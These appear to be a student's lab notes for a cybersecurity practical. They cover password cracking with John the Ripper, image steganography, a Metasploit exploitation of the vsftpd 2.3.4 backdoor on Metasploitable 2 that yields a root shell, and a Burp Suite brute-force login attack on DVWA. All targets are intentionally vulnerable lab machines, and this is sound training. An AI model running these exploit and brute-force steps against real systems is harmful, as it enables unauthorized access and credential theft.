# john --wordlist=/usr/share/wordlists/rockyou.txt password.txt



Cryptii - Encryption and Decryption website


Steganography:
Step 1: Prep an image with hidden text (do this first so you have something to find)

Open Command Prompt (Win+R → type cmd → Enter), then:

cd Desktop

Create a small text file with your "secret" message:

echo SECRET MESSAGE: exam2026 > hidden.txt

Now append it to any image you have on your Desktop (replace anyimage.jpg with a real image filename you have there):

copy /b anyimage.jpg + hidden.txt secret.jpg

This creates secret.jpg — a valid image with your text appended to the end of its raw bytes.

If you don't have any image on Desktop, grab one quickly:

copy C:\Windows\Web\Wallpaper\Windows\img0.jpg Desktop\anyimage.jpg
cd Desktop

Then run the copy /b command above.

Step 2: Now follow the manual's exact procedure

Step 1: Open Command Prompt (already open)

Step 2: Navigate to the directory containing the image

cd Desktop

Step 3: Verify the image file

dir

You should see secret.jpg listed.

Step 4: Open the image using Notepad

notepad secret.jpg

Step 5: Scroll to the end of the file
Notepad will open showing mostly unreadable binary characters/symbols — that's normal, it's the raw image data. Use Ctrl+End to jump straight to the bottom.

Step 6: Observe any hidden text appended to the image
At the very end, you should see your readable message: SECRET MESSAGE: exam2026

Expected output (per manual): hidden text, if present, is displayed at the end of the file.


B.3 StegOnline


Prac - 4 : 
Setup

Step 1: Boot Metasploitable 2
Start your Metasploitable 2 VM (separate from Kali — same virtual network/NAT so they can reach each other).

Step 2: Find its IP address
From your Kali terminal:

bash
sudo netdiscover -r 192.168.1.0/24

(Adjust the subnet to match your VM network — check Kali's own IP first with ip a if you're not sure of the range.)

Or use nmap to sweep:

bash
nmap -sn 192.168.1.0/24

Look for a device that isn't your Kali box or your host machine — that's likely Metasploitable 2.

Step 3: Confirm vsFTPd is running and check its version

bash
nmap -sV -p 21 <METASPLOITABLE_IP>

You're looking for vsftpd 2.3.4 in the output — that specific version has a known backdoor vulnerability.

Practice — Run the Exploit

Step 4: Launch Metasploit

bash
msfconsole

Step 5: Find and select the exploit

search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor

Step 6: Set the target

set RHOSTS <METASPLOITABLE_IP>

Step 7: Verify your settings

show options

Step 8: Run it

run

If successful, you'll drop into a shell — confirm you have root access on the target:

whoami
id
uname -a

That's the full exploit chain. Go ahead and start with Step 1–2 (boot the VM, find its IP) and tell me what nmap -sV -p 21 <IP> shows once you've got the address.









Burp Suite: 

Practical 3: Brute Force Attack on DVWA Using Burp Suite

1. Start the DVWA machine and Kali Linux. Make sure they can reach each other on the network.

2. Open Firefox → go to http://<DVWA_IP>/dvwa

3. Log in with admin / password

4. Go to DVWA Security (sidebar) → set Security Level to Low → click Submit

5. Go to Brute Force (sidebar)

6. Open Burp Suite → confirm the proxy listener is running on 127.0.0.1:8080

7. Set Firefox to use 127.0.0.1:8080 as its proxy

8. In Burp, go to Proxy → Intercept → turn Intercept ON

9. Back in DVWA's Brute Force form, type admin / test → click Login

10. Switch to Burp — the request should be sitting in Intercept. Right-click it → Send to Intruder

11. In Intruder → Positions tab:

Click Clear
Highlight only the password value in the request
Click Add
Set Attack Type to Sniper

12. Go to Payloads tab:

Payload type: Simple list
Add these passwords, one per line:
     123456
     admin
     password
     welcome
     password123

13. Click Start Attack

14. In the results table, check the Length column. Sort by it if needed. Most failed attempts will show the same length (e.g. 4832) — the one row with a different length (e.g. 5120) is the successful login.

15. That password (password in the standard DVWA setup) is your cracked credential.




Practical 2 - B.2:
Practical 2 — B.2: Image Steganography Using Stegosuite (Kali Linux)

1. Open the Terminal

2. Launch Stegosuite:

stegosuite

3. In the window that opens, click File → Open (or drag an image into it)

4. Select an image (any .png or .jpg)

5. Go to the Embed tab

6. Type your secret message in the message box, e.g. HIDDEN DATA FOR EXAM

7. Enter a passphrase, e.g. exam123

8. Click Embed

9. Save the modified image when prompted (e.g. test_stego.png)

10. Reopen that saved image — File → Open → select test_stego.png

11. Go to the Extract tab

12. Enter the same passphrase (exam123)

13. Click Extract

14. Your original message (HIDDEN DATA FOR EXAM) should reappear, confirming the embed/extract worked.
